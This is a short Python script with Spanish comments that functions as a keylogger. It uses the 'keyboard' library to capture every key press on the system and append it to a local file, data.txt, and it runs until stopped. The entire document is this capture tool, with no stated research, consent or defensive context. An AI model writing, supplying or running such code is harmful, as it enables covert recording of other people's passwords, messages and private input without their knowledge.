# pip install keyboard

import keyboard

def pressed_keys(event):
    try:
        with open('data.txt', 'a') as file:
            if event.name == 'space':
                file.write(' ')  # Agregar un espacio en lugar de nada
            elif event.name == 'enter':
                file.write('\n')  # Agregar una nueva línea cuando se presiona Enter
            else:
                file.write(event.name)
    except Exception as e:
        print(f"Error al escribir en el archivo: {e}")

keyboard.on_press(pressed_keys)
keyboard.wait()
